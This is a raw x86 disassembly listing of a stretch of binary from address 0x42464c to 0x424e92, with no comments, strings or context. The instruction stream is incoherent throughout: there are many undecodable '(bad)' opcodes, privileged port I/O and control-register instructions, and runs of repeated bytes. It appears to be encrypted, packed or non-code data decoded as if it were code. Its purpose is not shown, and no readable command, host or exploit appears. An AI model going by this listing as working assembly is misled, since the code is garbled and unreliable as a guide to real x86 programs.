  42464c:	sub    dh,BYTE PTR [edx-0x454df37a]
  424652:	sub    edi,edi
  424654:	mov    dl,0xec
  424656:	add    BYTE PTR [eax-0xf7f7589],0x8a
  42465d:	push   ebx
  42465e:	sub    dl,BYTE PTR [ebx-0x4]
  424661:	mov    dl,0xba
  424663:	sub    DWORD PTR [edx-0x4d00f37a],esi
  424669:	xor    al,0x84
  42466c:	pop    edi
  42466d:	out    dx,al
  42466e:	and    BYTE PTR [ecx],cl
  424670:	dec    edi
  424671:	adc    DWORD PTR ds:0x77804d4d,ecx
  424677:	xor    al,BYTE PTR [eax-0x4d92cd10]
  42467d:	xchg   BYTE PTR [ecx],ch
  42467f:	add    DWORD PTR [ecx],esp
  424681:	add    esi,ebp
  424683:	lea    ecx,[ebp-0x7f4d0073]
  424689:	lock not DWORD PTR [edi-0xa]
  42468d:	and    al,0x6f
  42468f:	cmp    BYTE PTR [esi+0x4d4d8afe],bh
  424695:	xor    BYTE PTR [edi-0x76],0x80
  424699:	lock mov dl,BYTE PTR [ebx-0x4]
  42469d:	push   ebx
  42469e:	sub    dh,BYTE PTR [edx-0x454df37a]
  4246a4:	sub    edi,edi
  4246a6:	mov    dl,0x5f
  4246a8:	ja     0x424630
  4246aa:	xlat   BYTE PTR ds:[ebx]
  4246ab:	out    dx,eax
  4246ac:	xor    BYTE PTR [edi-0x75],0x80
  4246b0:	lock mov eax,esp
  4246b3:	outs   dx,DWORD PTR ds:[esi]
  4246b4:	xor    BYTE PTR [edi-0x76],0x80
  4246b8:	lock mov dl,BYTE PTR [ebx+0x2a]
  4246bc:	push   ebx
  4246bd:	cld    
  4246be:	stos   DWORD PTR es:[edi],eax
  4246bf:	mov    dl,0xba
  4246c1:	sub    DWORD PTR [edx-0x56f37a],esi
  4246c7:	mov    dl,0xa3
  4246c9:	jo     0x4246c6
  4246cb:	out    dx,eax
  4246cc:	lea    edx,[edi-0x78127880]
  4246d2:	xor    eax,0xf68a777c
  4246d7:	and    al,0x6f
  4246d9:	cmp    BYTE PTR [edi+esi*2-0x7c],bh
  4246dd:	cmc    
  4246de:	and    al,0x6f
  4246e0:	cmp    BYTE PTR [eax+0x77502177],al
  4246e6:	and    DWORD PTR [ecx+0x77806a80],ebx
  4246ec:	mov    al,BYTE PTR [eax+0xde28a97]
  4246f2:	pusha  
  4246f3:	and    ah,BYTE PTR [edi+ebp*2]
  4246f6:	cmp    BYTE PTR [ebx-0x4e],dl
  4246f9:	test   eax,0xf8b27e53
  4246fe:	sub    DWORD PTR [edx-0x400f37a],esi
  424704:	adc    BYTE PTR [edi+0x9f763ef],0xf
  42470b:	loopne 0x424747
  42470d:	lea    ecx,[ebp-0x7f108880]
  424713:	xchg   edi,eax
  424714:	out    dx,eax
  424715:	in     al,dx
  424716:	or     ah,BYTE PTR [ebp-0x65]
  424719:	push   eax
  42471a:	xchg   edi,eax
  42471b:	enter  0x777c,0x8b
  42471f:	icebp  
  424720:	and    al,0x6f
  424722:	cmp    BYTE PTR [eax-0x687f7489],al
  424728:	mov    edx,DWORD PTR [ebx+0x7e]
  42472b:	mov    dl,0xf8
  42472d:	sub    DWORD PTR [ebx-0x4e],edx
  424730:	mov    dl,0x86
  424732:	or     al,0xff
  424734:	sti    
  424735:	adc    BYTE PTR [edi-0x75187f76],0x53
  42473c:	mov    dh,0x53
  42473e:	or     eax,0xb229bcb2
  424743:	pop    es
  424744:	or     al,0xff
  424746:	pushf  
  424747:	and    bh,0xc8
  42474a:	pop    edi
  42474b:	xchg   ebp,eax
  42474c:	jl     0x42472b
  42474e:	or     DWORD PTR [edi],ecx
  424750:	mov    bl,0x3a
  424752:	lea    ecx,[ebp-0x7f376880]
  424758:	ja     0x424749
  42475a:	in     al,dx
  42475b:	jmp    0x9780:0x8d8d8d2e
  424762:	out    dx,eax
  424763:	and    bh,0xc8
  424766:	inc    ebx
  424767:	fwait
  424768:	push   ebp
  424769:	and    bh,0x8a
  42476c:	xchg   ebx,eax
  42476d:	and    BYTE PTR [edi+0x53cb538a],0x4
  424774:	mov    dl,0x61
  424776:	or     al,0xb2
  424778:	mov    ah,0x29
  42477a:	inc    DWORD PTR [esi]
  42477c:	push   eax
  42477d:	xchg   edi,eax
  42477e:	and    DWORD PTR [ebx-0x64],0x9
  424782:	jns    0x80cfd4c2
  424788:	xchg   edi,eax
  424789:	mov    al,BYTE PTR [eax-0x49ac7519]
  42478f:	push   ebx
  424790:	or     eax,0xb20c07b2
  424795:	mov    esp,0x509cff29
  42479a:	xchg   edi,eax
  42479b:	xor    bh,BYTE PTR [edi+esi*2+0x21]
  42479f:	repz and al,0x6f
  4247a2:	cmp    BYTE PTR [eax-0x187f7569],al
  4247a8:	mov    dl,BYTE PTR [ebx-0x4a]
  4247ab:	push   ebx
  4247ac:	or     eax,0xb20c07b2
  4247b1:	mov    esp,0xbe9cff29
  4247b6:	add    eax,0x808d8d8d
  4247bb:	xchg   edi,eax
  4247bc:	mov    al,BYTE PTR [eax+0xbed8ad7]
  4247c2:	or     eax,0x2b2b653
  4247c7:	sub    DWORD PTR [edx+0x7eff0c07],esi
  4247cd:	add    ebx,edx
  4247cf:	mov    esi,DWORD PTR [esi+0x97e6388]
  4247d5:	in     eax,dx
  4247d6:	jmp    0x43cfd568
  4247db:	ret    0xe501
  4247de:	or     ch,bh
  4247e0:	push   eax
  4247e1:	xlat   BYTE PTR ds:[ebx]
  4247e2:	stc    
  4247e3:	or     DWORD PTR [ebx+ebx*1-0x5e],ebx
  4247e7:	clc    
  4247e8:	dec    ebp
  4247e9:	or     DWORD PTR [ebp-0x7868af73],ecx
  4247ef:	adc    BYTE PTR [edi-0x7f8e1379],0xd7
  4247f6:	xchg   esp,ebp
  4247f8:	xor    DWORD PTR [edx+0x2b22907],0x9c2ff0c
  424802:	pop    esp
  424803:	sbb    esi,DWORD PTR [edx+0xba22107]
  424809:	mul    BYTE PTR [edi+ebp*2]
  42480c:	cmp    BYTE PTR [eax-0x29],dl
  42480f:	xchg   DWORD PTR [eax-0x69],edx
  424812:	xchg   BYTE PTR [eax-0x287f7869],al
  424818:	xchg   DWORD PTR [ebx-0x4a],edx
  42481b:	in     eax,dx
  42481c:	or     ecx,DWORD PTR ds:0xb20c07b2
  424822:	add    ch,BYTE PTR [ecx]
  424824:	(bad)  
  424825:	jle    0x424813
  424827:	xchg   edi,eax
  424828:	out    dx,eax
  424829:	push   eax
  42482a:	xchg   edi,eax
  42482b:	xchg   DWORD PTR [eax-0x287fde69],eax
  424831:	and    DWORD PTR [ebx-0x4a],edx
  424834:	in     eax,dx
  424835:	or     ecx,DWORD PTR ds:0xb22902b2
  42483b:	pop    es
  42483c:	or     al,0xff
  42483e:	jle    0x4247c0
  424840:	xlat   BYTE PTR ds:[ebx]
  424841:	xchg   BYTE PTR [ebx-0x3e],ah
  424844:	xlat   BYTE PTR ds:[ebx]
  424845:	rol    BYTE PTR [eax-0x287fde69],0x21
  42484c:	push   ebx
  42484d:	mov    dh,0xed
  42484f:	or     ecx,DWORD PTR ds:0xb22902b2
  424855:	pop    es
  424856:	or     al,0xff
  424858:	jle    0x4247da
  42485a:	xlat   BYTE PTR ds:[ebx]
  42485b:	xchg   BYTE PTR [ebx-0x3e],ah
  42485e:	xlat   BYTE PTR ds:[ebx]
  42485f:	out    dx,eax
  424860:	adc    BYTE PTR [edi-0x7c287f79],0x3a
  424867:	aam    0xed
  424869:	jl     0x424877
  42486b:	dec    ebp
  42486c:	lock stc 
  42486e:	or     DWORD PTR [edi+0x12],ecx
  424871:	dec    ebp
  424872:	dec    ebp
  424873:	dec    ebp
  424874:	cmp    ah,BYTE PTR [edi-0x74687fce]
  42487a:	adc    bh,0x8b
  42487d:	push   ebx
  42487e:	mov    dh,0xed
  424880:	or     ecx,DWORD PTR ds:0xb22902b2
  424886:	pop    es
  424887:	or     al,0xff
  424889:	jle    0x42480b
  42488b:	xlat   BYTE PTR ds:[ebx]
  42488c:	xor    al,BYTE PTR [eax-0x2a9c3719]
  424892:	pushf  
  424893:	in     eax,0xd3
  424895:	sub    eax,0x808a9780
  42489a:	xlat   BYTE PTR ds:[ebx]
  42489b:	mov    dl,BYTE PTR [ebx-0x4a]
  42489e:	in     eax,dx
  42489f:	or     ecx,DWORD PTR ds:0xb20c07b2
  4248a5:	add    ch,BYTE PTR [ecx]
  4248a7:	in     al,dx
  4248a8:	je     0x4248a9
  4248aa:	jle    0x42482c
  4248ac:	popf   
  4248ad:	out    dx,al
  4248ae:	arpl   WORD PTR [ebx],ax
  4248b0:	or     DWORD PTR [edi-0x12],ecx
  4248b3:	dec    ebp
  4248b4:	dec    ebp
  4248b5:	dec    ebp
  4248b6:	mov    ds:0x53847780,eax
  4248bb:	mov    dl,0x80
  4248bd:	lock test ch,ch
  4248c0:	add    eax,0xa6c4ab0d
  4248c5:	xor    BYTE PTR [edi-0x76],0x53
  4248c9:	mov    dl,0x80
  4248cb:	lock mov dl,BYTE PTR [ebx+0x51]
  4248cf:	mov    dl,0xba
  4248d1:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4248d7:	test   eax,0x8deffb70
  4248dc:	xchg   edi,eax
  4248dd:	add    BYTE PTR [edi-0x7285785e],0x8d
  4248e4:	lea    edi,[edi+esi*2-0x76]
  4248e8:	mul    BYTE PTR [edi+ebp*2]
  4248eb:	cmp    BYTE PTR [edi+esi*2-0x75],bh
  4248ef:	cmc    
  4248f0:	and    al,0x6f
  4248f2:	cmp    BYTE PTR [eax-0xf7f7589],al
  4248f8:	mov    bl,BYTE PTR [ecx-0x5f21d65]
  4248fe:	and    ah,BYTE PTR [edi+ebp*2]
  424901:	cmp    BYTE PTR [ebx-0x4],dl
  424904:	mov    dl,0x86
  424906:	or     al,0xae
  424908:	push   ebx
  424909:	(bad)  
  42490a:	mov    dl,0xba
  42490c:	sub    edi,edi
  42490e:	mov    dl,0x50
  424910:	ja     0x424896
  424912:	xor    BYTE PTR [edi-0x76],0x80
  424916:	lock mov dl,BYTE PTR [ebx-0x4]
  42491a:	mov    dl,0x86
  42491c:	or     al,0x53
  42491e:	(bad)  
  42491f:	mov    dl,0xba
  424921:	sub    edi,edi
  424923:	mov    dl,0x50
  424925:	ja     0x42491e
  424927:	and    bh,0x25
  42492a:	xor    BYTE PTR [edi-0x79],0x80
  42492e:	lock xchg DWORD PTR [ebx-0x4e],edx
  424932:	push   eax
  424933:	ja     0x4248bc
  424935:	mov    ds:0xa3f68777,al
  42493a:	outs   dx,DWORD PTR ds:[esi]
  42493b:	cmp    BYTE PTR [eax-0xf7f3789],al
  424941:	enter  0xb253,0x50
  424945:	ja     0x42490f
  424947:	mov    ds:0xe9f6c877,al
  42494c:	outs   dx,DWORD PTR ds:[esi]
  42494d:	cmp    BYTE PTR [eax-0xf7fcd89],al
  424953:	xor    dl,BYTE PTR [ebx-0x4e]
  424956:	push   eax
  424957:	ja     0x42498b
  424959:	mov    ds:0x24fa3277,al
  42495e:	outs   dx,DWORD PTR ds:[esi]
  42495f:	cmp    BYTE PTR [eax-0xf7f0689],al
  424965:	stc    
  424966:	push   ebx
  424967:	mov    dl,0x50
  424969:	ja     0x424964
  42496b:	mov    ds:0x24f6f977,al
  424970:	out    dx,al
  424971:	cmp    BYTE PTR [edi+esi*2+0x25],bh
  424975:	jmp    0x807ad63c
  42497a:	ja     0x42496b
  42497c:	dec    edi
  42497d:	push   0x9
  42497f:	movd   mm5,DWORD PTR [edi]
  424982:	lea    ecx,[ebp+0x4f217780]
  424988:	push   0x9
  42498a:	(bad)  
  42498c:	das    
  42498d:	lea    ecx,[ebp+0x4f1d7780]
  424993:	push   0x9
  424995:	mov    db5,edi
  424998:	lea    ecx,[ebp-0x7fda8880]
  42499e:	ja     0x4249c5
  4249a0:	xor    al,0xef
  4249a3:	mov    dl,0x86
  4249a5:	or     al,0x57
  4249a7:	(bad)  
  4249a8:	hlt    
  4249a9:	lea    ecx,[ebp+0x93a5fb9]
  4249af:	dec    edi
  4249b0:	cmp    ch,BYTE PTR [edi]
  4249b2:	lea    ecx,[ebp-0x7f758880]
  4249b8:	lock mov dl,BYTE PTR [ebx-0x4]
  4249bc:	mov    dl,0x86
  4249be:	or     al,0x53
  4249c0:	(bad)  
  4249c1:	mov    dl,0xba
  4249c3:	sub    edi,edi
  4249c5:	mov    dl,0x50
  4249c7:	ja     0x4249c0
  4249c9:	xor    BYTE PTR [edi-0x76],0x80
  4249cd:	ja     0x424959
  4249cf:	xor    BYTE PTR [edi-0x11],0x80
  4249d3:	lock out dx,eax
  4249d5:	in     al,dx
  4249d6:	jge    0x424a3d
  4249d8:	adc    BYTE PTR [edx+0x25f0500a],0x4f
  4249df:	push   0x9
  4249e1:	cvtpi2ps xmm5,mm6
  4249e4:	lea    ecx,[ebp-0x9858884]
  4249ea:	and    al,0x79
  4249ec:	cmp    BYTE PTR [eax-0x7f6c8589],al
  4249f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4249f3:	jp     0x424a48
  4249f5:	cld    
  4249f6:	push   ebx
  4249f7:	add    esi,DWORD PTR [edx-0x4b4df37a]
  4249fd:	sub    edi,edi
  4249ff:	adc    BYTE PTR [eax-0x59],0x7a
  424a03:	xor    BYTE PTR [edi-0x76],0x80
  424a07:	ja     0x424993
  424a09:	or     dh,0x2e
  424a0c:	cmp    cl,BYTE PTR [ebp-0x7f8e7f73]
  424a12:	stos   BYTE PTR es:[edi],al
  424a13:	gs in  al,dx
  424a15:	jno    0x424997
  424a17:	ja     0x4249a3
  424a19:	xor    BYTE PTR [edi-0x76],0x80
  424a1d:	into   
  424a1e:	cmp    cl,BYTE PTR es:[ebp+0x501d808d]
  424a25:	xchg   edi,eax
  424a26:	and    DWORD PTR [ebx-0x5c],esp
  424a29:	xlat   BYTE PTR ds:[ebx]
  424a2a:	imul   eax,DWORD PTR [eax-0x317f3710],0x32
  424a31:	cmp    cl,BYTE PTR [ebp-0x7b68fe73]
  424a37:	stos   BYTE PTR es:[edi],al
  424a38:	adc    BYTE PTR [edi-0x12aeac38],0xc2
  424a3f:	or     eax,0xb20cbeb2
  424a44:	clc    
  424a45:	sub    edi,edi
  424a47:	mov    dh,0x80
  424a49:	lock and DWORD PTR [edx-0x6cf561b3],ebp
  424a50:	dec    ebp
  424a51:	or     ah,BYTE PTR ds:0x8021f080
  424a57:	xchg   edx,eax
  424a58:	xchg   ebp,eax
  424a59:	cmp    BYTE PTR [edi+0xa],0x43
  424a5d:	std    
  424a5e:	xchg   esi,eax
  424a5f:	in     al,dx
  424a60:	je     0x424a6c
  424a62:	xchg   BYTE PTR [ecx-0x7f727291],ah
  424a68:	lock and eax,0x3a36ce80
  424a6e:	lea    ecx,[ebp-0x61b2e2b0]
  424a74:	xchg   ebp,eax
  424a75:	dec    ebp
  424a76:	xlat   BYTE PTR ds:[ebx]
  424a77:	out    dx,eax
  424a78:	xchg   ebx,eax
  424a79:	xchg   BYTE PTR [edi-0x7f727212],ch
  424a7f:	xchg   ebx,eax
  424a80:	gs in  al,dx
  424a82:	xchg   esp,eax
  424a83:	or     DWORD PTR [eax+ebx*8+0x15],ebx
  424a87:	add    DWORD PTR [ebp+0x71],esi
  424a8a:	sbb    eax,0x801d7750
  424a8f:	ja     0x424a1b
  424a91:	xor    al,0x8a
  424a94:	push   ebx
  424a95:	cld    
  424a96:	in     eax,dx
  424a97:	add    eax,0x29bab20d
  424a9c:	mov    dl,0x86
  424a9e:	or     al,0xff
  424aa0:	mov    dl,0x9
  424aa2:	pop    esp
  424aa3:	fisubr DWORD PTR [edi+0x50]
  424aa6:	xchg   edi,eax
  424aa7:	and    eax,0xf09fd63
  424aac:	mov    esp,0x808d8d8d
  424ab1:	ja     0x424a3d
  424ab3:	xor    al,0x8a
  424ab6:	push   ebx
  424ab7:	cld    
  424ab8:	in     eax,dx
  424ab9:	add    eax,0x29bab20d
  424abe:	mov    dl,0x86
  424ac0:	or     al,0xff
  424ac2:	mov    dl,0x50
  424ac4:	ja     0x424a49
  424ac6:	xor    BYTE PTR [edi-0x75],0x80
  424aca:	lock mov ebp,ebp
  424acd:	add    eax,0xb2fc530d
  424ad2:	mov    edx,0xc86b229
  424ad7:	push   DWORD PTR [edx+0x6fda5c09]
  424add:	inc    ebx
  424ade:	std    
  424adf:	pop    edi
  424ae0:	lock or DWORD PTR [ecx],0xffffffce
  424ae4:	and    cl,BYTE PTR [ebp-0xf7f7273]
  424aea:	sbb    eax,0x50efb2ed
  424aef:	lock sbb eax,0xf080ecc4
  424af5:	sbb    eax,0x805dd880
  424afa:	push   cs
  424afb:	push   eax
  424afc:	ja     0x424a80
  424afe:	jge    0x424b4f
  424b00:	not    ebp
  424b02:	xor    BYTE PTR [ebx-0x9],cl
  424b05:	xor    edi,ebx
  424b07:	in     al,dx
  424b08:	ja     0x424a8c
  424b0a:	les    ecx,FWORD PTR [eax+eax*4]
  424b0d:	sti    
  424b0e:	or     al,BYTE PTR [eax+0x74ecee92]
  424b14:	or     al,BYTE PTR [esi-0x7272d05d]
  424b1a:	xor    BYTE PTR [edi+0x1d],0x80
  424b1e:	jge    0x424b0f
  424b20:	push   eax
  424b21:	lock add BYTE PTR [eax-0x687f7510],0x8a
  424b29:	push   ebx
  424b2a:	push   ecx
  424b2b:	in     eax,dx
  424b2c:	ret    0xb20d
  424b2f:	mov    esi,0x29f8b20c
  424b34:	(bad)  
  424b35:	(bad)  
  424b36:	pop    edi
  424b37:	lock adc ch,0x1d
  424b3b:	xor    al,0xef
  424b3e:	in     al,dx
  424b3f:	jge    0x424b62
  424b41:	dec    ebp
  424b42:	xlat   BYTE PTR ds:[ebx]
  424b43:	add    BYTE PTR [eax-0x13691193],0x74
  424b4a:	or     al,BYTE PTR [esi-0x7272137b]
  424b50:	xor    BYTE PTR [edi+0x1d],0x80
  424b54:	lock mov eax,DWORD PTR [eax+0x51538b97]
  424b5b:	mov    dl,0xbe
  424b5d:	or     al,0xed
  424b5f:	ret    0xed0d
  424b62:	push   0x3d
  424b64:	mov    dl,0xf8
  424b66:	sub    edi,edi
  424b68:	(bad)  
  424b69:	cmp    dh,al
  424b6b:	add    DWORD PTR [eax+0x77502597],0x1d
  424b72:	xor    BYTE PTR [edi-0x75],0x80
  424b76:	lock mov ebp,ebp
  424b79:	add    eax,0xb2fc530d
  424b7e:	mov    edx,0xc86b229
  424b83:	push   DWORD PTR [edx+0x925f080]
  424b89:	pop    esp
  424b8a:	jg     0x424bfb
  424b8c:	inc    ebx
  424b8d:	std    
  424b8e:	pop    edi
  424b8f:	lock or DWORD PTR [ecx],0x4c
  424b93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424b94:	dec    ebp
  424b95:	dec    ebp
  424b96:	dec    ebp
  424b97:	or     dh,0x26
  424b9a:	cmp    cl,BYTE PTR [ebp-0x28e29c73]
  424ba0:	push   ebx
  424ba1:	xor    al,0x32
  424ba4:	or     dh,0x32
  424ba7:	cmp    cl,BYTE PTR [ebp-0x7b68fe73]
  424bad:	stos   BYTE PTR es:[edi],al
  424bae:	adc    BYTE PTR [edi-0x12aeacce],0xc2
  424bb5:	or     eax,0xb20cbeb2
  424bba:	clc    
  424bbb:	sub    edi,edi
  424bbd:	mov    dh,0x80
  424bbf:	lock and DWORD PTR [edx-0x6c6a61b3],ebp
  424bc6:	dec    ebp
  424bc7:	or     ah,BYTE PTR ds:0xf096a4f
  424bcd:	pushf  
  424bce:	or     al,0x8d
  424bd0:	lea    eax,[eax-0x317fda69]
  424bd6:	cmp    BYTE PTR [edx],0x8d
  424bd9:	lea    eax,[eax+0x53fd808d]
  424bdf:	push   ecx
  424be0:	in     eax,dx
  424be1:	xor    cl,BYTE PTR ds:0xb20cbeb2
  424be7:	test   BYTE PTR [ecx],ch
  424be9:	(bad)  
  424bea:	std    
  424beb:	or     DWORD PTR [edi],ecx
  424bed:	jb     0x424c29
  424bef:	lea    ecx,[ebp-0x7f758880]
  424bf5:	lock mov dl,BYTE PTR [ebx-0x4]
  424bf9:	in     eax,dx
  424bfa:	add    eax,0xc86b20d
  424bff:	mov    dl,0xba
  424c01:	sub    edi,edi
  424c03:	mov    dl,0x50
  424c05:	ja     0x424b8d
  424c07:	pop    esi
  424c08:	imul   ebp,ecx,0x7d01386f
  424c0e:	test   BYTE PTR [eax-0x10],dl
  424c11:	pop    esi
  424c12:	push   eax
  424c13:	lock data16 jl 0x424c8e
  424c17:	inc    esi
  424c18:	sbb    ecx,ebp
  424c1a:	outs   dx,DWORD PTR ds:[esi]
  424c1b:	cmp    BYTE PTR [edi+esi*2+0x62],bh
  424c1f:	call   0x507abc0d
  424c24:	ja     0x424c7c
  424c26:	jl     0x424c9f
  424c28:	push   0xfffffff6
  424c2a:	and    al,0x6f
  424c2c:	cmp    BYTE PTR [ebx+0x70],dl
  424c2f:	adc    BYTE PTR [ebp+0x7b24601],0xc
  424c36:	mov    ds:0x8df4c4c2,al
  424c3b:	lea    edi,[ecx+0x75f01650]
  424c41:	dec    ebp
  424c42:	dec    ebp
  424c43:	dec    ebp
  424c44:	xchg   edx,eax
  424c45:	in     eax,dx
  424c46:	retf   
  424c47:	outs   dx,DWORD PTR ds:[esi]
  424c48:	in     al,0xb8
  424c4a:	pusha  
  424c4b:	mov    ecx,0x50386fe9
  424c50:	dec    edi
  424c51:	xchg   ebp,eax
  424c52:	dec    ebp
  424c53:	dec    ebp
  424c54:	dec    ebp
  424c55:	push   eax
  424c56:	dec    edi
  424c57:	mov    ebp,0x504d4d4d
  424c5c:	ja     0x424cb8
  424c5e:	push   eax
  424c5f:	ja     0x424c77
  424c61:	add    DWORD PTR [edx+0xa96018a],edx
  424c67:	push   eax
  424c68:	ja     0x424c98
  424c6a:	push   eax
  424c6b:	ja     0x424ca3
  424c6d:	jl     0x424cbe
  424c6f:	or     cl,BYTE PTR [ebp+0x4d]
  424c72:	dec    ebp
  424c73:	bnd jmp 0x19284e8
  424c79:	popf   
  424c7a:	dec    ebp
  424c7b:	dec    ebp
  424c7c:	dec    ebp
  424c7d:	push   eax
  424c7e:	sbb    BYTE PTR [ebp+0x7c4d4d4d],ah
  424c84:	dec    edi
  424c85:	lods   eax,DWORD PTR ds:[esi]
  424c86:	dec    ebp
  424c87:	dec    ebp
  424c88:	dec    ebp
  424c89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424c8a:	jmp    0x4fbe84fe
  424c8f:	mov    ch,0x4d
  424c91:	dec    ebp
  424c92:	dec    ebp
  424c93:	sbb    ecx,ebp
  424c95:	outs   dx,DWORD PTR ds:[esi]
  424c96:	cmp    BYTE PTR [edi+ecx*2-0x3b],bh
  424c9a:	dec    ebp
  424c9b:	dec    ebp
  424c9c:	dec    ebp
  424c9d:	icebp  
  424c9e:	jmp    0x4fbe8512
  424ca3:	push   edx
  424ca4:	dec    ebp
  424ca5:	dec    ebp
  424ca6:	dec    ebp
  424ca7:	sbb    ecx,ebp
  424ca9:	outs   dx,DWORD PTR ds:[esi]
  424caa:	cmp    BYTE PTR [edi+ecx*2-0x2b],bh
  424cae:	dec    ebp
  424caf:	dec    ebp
  424cb0:	dec    ebp
  424cb1:	call   0x507abc9f
  424cb6:	add    ebp,ebx
  424cb8:	dec    ebp
  424cb9:	dec    ebp
  424cba:	dec    ebp
  424cbb:	jl     0x424d0c
  424cbd:	in     eax,0x4d
  424cbf:	dec    ebp
  424cc0:	dec    ebp
  424cc1:	fucompp 
  424cc3:	outs   dx,DWORD PTR ds:[esi]
  424cc4:	cmp    BYTE PTR [eax-0x69],dl
  424cc7:	int    0x7c
  424cc9:	ja     0x424cda
  424ccb:	nop
  424ccc:	jmp    0xf0928540
  424cd1:	adc    BYTE PTR [edi+esi*2+0x41],bh
  424cd5:	cmc    
  424cd6:	jmp    0xf092854a
  424cdb:	push   ds
  424cdc:	jl     0x424d55
  424cde:	es (bad) 
  424ce0:	jmp    0x77be8554
  424ce5:	mul    BYTE PTR ds:[edi+ebp*2]
  424ce9:	cmp    BYTE PTR [ebx+0x6a],dl
  424cec:	add    BYTE PTR [ecx+0x4f],0xa
  424cf0:	dec    ebp
  424cf1:	dec    ebp
  424cf2:	dec    ebp
  424cf3:	mov    dl,0xbe
  424cf5:	or     al,0xcd
  424cf7:	add    eax,0x2f4110c4
  424cfc:	inc    ebp
  424cfd:	dec    ebp
  424cfe:	dec    ebp
  424cff:	dec    ebp
  424d00:	ins    DWORD PTR es:[edi],dx
  424d01:	in     eax,dx
  424d02:	mov    ebx,DWORD PTR [ebx]
  424d04:	in     al,0x2
  424d06:	or     dh,0x32
  424d09:	cmp    cl,BYTE PTR [ebp+0x7501018d]
  424d0f:	dec    ebp
  424d10:	dec    ebp
  424d11:	dec    ebp
  424d12:	xchg   esi,eax
  424d13:	dec    ebp
  424d14:	or     ch,dh
  424d16:	sbb    BYTE PTR [edx],0x32
  424d19:	cmp    cl,BYTE PTR [ebp+0x4518018d]
  424d1f:	dec    ebp
  424d20:	dec    ebp
  424d21:	dec    ebp
  424d22:	stos   BYTE PTR es:[edi],al
  424d23:	or     cl,BYTE PTR [ebp-0x6a]
  424d26:	out    dx,eax
  424d27:	push   eax
  424d28:	ja     0x424d27
  424d2a:	add    DWORD PTR [edi-0x7a],esi
  424d2d:	or     al,BYTE PTR [eax-0x72c5d932]
  424d33:	lea    ecx,[ebp-0x7f]
  424d36:	xor    BYTE PTR [edi-0x3],0x4d
  424d3a:	test   DWORD PTR [eax-0xf7f7589],0xedfc538a
  424d44:	add    eax,0xc86b20d
  424d49:	mov    dl,0xba
  424d4b:	sub    edi,edi
  424d4d:	mov    dl,0x50
  424d4f:	ja     0x424d00
  424d51:	xor    al,0x8a
  424d54:	xor    BYTE PTR [edi-0x76],0x53
  424d58:	push   ecx
  424d59:	in     eax,dx
  424d5a:	xor    cl,BYTE PTR ds:0xb22984b2
  424d60:	mov    esi,0x80fdff0c
  424d65:	ja     0x424ced
  424d67:	arpl   WORD PTR [edx+0x775097d5],si
  424d6d:	jbe    0x424d33
  424d6f:	or     DWORD PTR [eax+0x76f0808d],eax
  424d75:	push   eax
  424d76:	ja     0x424cfe
  424d78:	xor    BYTE PTR [edi-0x7a],0x63
  424d7c:	mov    dl,0xd5
  424d7e:	iret   
  424d7f:	or     BYTE PTR [edx],0x1d
  424d82:	sbb    BYTE PTR [edx],0x26
  424d85:	cmp    cl,BYTE PTR [ebp-0x28f19c73]
  424d8b:	stc    
  424d8c:	sbb    BYTE PTR [edx],0x26
  424d8f:	cmp    cl,BYTE PTR [ebp+0x1d0a808d]
  424d95:	arpl   WORD PTR [esi],cx
  424d97:	xlat   BYTE PTR ds:[ebx]
  424d98:	cmp    eax,DWORD PTR [eax-0x72c5d1e6]
  424d9e:	lea    eax,[eax-0x557fde69]
  424da4:	cmp    eax,0xa500eec
  424da9:	and    eax,0x808b7780
  424dae:	lock mov edx,DWORD PTR [ebx-0x4]
  424db2:	in     eax,dx
  424db3:	add    eax,0xc86b20d
  424db8:	mov    dl,0xba
  424dba:	sub    edi,edi
  424dbc:	mov    dl,0x50
  424dbe:	ja     0x424d6f
  424dc0:	adc    BYTE PTR [edi-0x796c64db],0x3
  424dc7:	enter  0x4d4d,0x4f
  424dcb:	push   0x9
  424dcd:	movd   DWORD PTR [ebp-0x28b27273],mm1
  424dd4:	and    eax,0x86932a80
  424dd9:	sub    eax,0x4f4d4dc8
  424dde:	push   0x9
  424de0:	pcmpeqb mm1,QWORD PTR [ebp+0x77808d8d]
  424de7:	and    eax,0x94802a80
  424dec:	xchg   BYTE PTR [eax+0x4f4d4dc2],bh
  424df2:	push   0x9
  424df4:	mov    cr1,ebp
  424df7:	lea    ecx,[ebp-0x6e796c65]
  424dfd:	mov    ecx,DWORD PTR [ebp+0x4d]
  424e00:	dec    edi
  424e01:	push   0x9
  424e03:	ucomiss xmm1,DWORD PTR [ebp-0x317f7273]
  424e0a:	cmp    cl,BYTE PTR es:[ebp-0x28e29c73]
  424e11:	sbb    eax,DWORD PTR [eax-0x72c5cd32]
  424e17:	lea    eax,[ecx]
  424e19:	lock test BYTE PTR [esi-0x7f7b28b3],dl
  424e20:	lock and DWORD PTR [ebp-0x62],ecx
  424e24:	xchg   ebp,eax
  424e25:	xchg   ebx,eax
  424e26:	dec    ebp
  424e27:	or     ah,BYTE PTR ds:0x3a82ce80
  424e2d:	lea    ecx,[ebp-0x27f7280]
  424e33:	push   ebx
  424e34:	push   ecx
  424e35:	in     eax,dx
  424e36:	xor    cl,BYTE PTR ds:0xb20cbeb2
  424e3c:	test   BYTE PTR [ecx],ch
  424e3e:	(bad)  
  424e3f:	std    
  424e40:	aad    0x0
  424e42:	jl     0x424ebb
  424e44:	out    dx,eax
  424e45:	mul    BYTE PTR [ebx]
  424e47:	outs   dx,DWORD PTR ds:[esi]
  424e48:	cmp    BYTE PTR [eax-0xf7f1089],al
  424e4e:	out    dx,eax
  424e4f:	xor    BYTE PTR [edi+0x25],0xb2
  424e53:	mov    esi,0xc405a20c
  424e58:	hlt    
  424e59:	lea    ecx,[ebp+0x197d30b9]
  424e5f:	sub    BYTE PTR [ebp+0x3d],0x80
  424e63:	lock sub eax,0x925074ec
  424e69:	adc    eax,0x7c2d7780
  424e6e:	(bad)  
  424e6f:	in     al,dx
  424e70:	lea    ecx,[ebp+0x2d77808d]
  424e76:	push   eax
  424e77:	popf   
  424e78:	out    dx,al
  424e79:	xor    BYTE PTR [edi+0x71],0x80
  424e7d:	lock sub eax,0x80ef9250
  424e83:	ja     0x424e9a
  424e85:	xor    al,0x2d
  424e88:	push   eax
  424e89:	xchg   edx,eax
  424e8a:	and    esp,eax
  424e8c:	adc    eax,0x80257780
  424e91:	ins    DWORD PTR es:[edi],dx
  424e92:	cmp    eax,0xec2df080
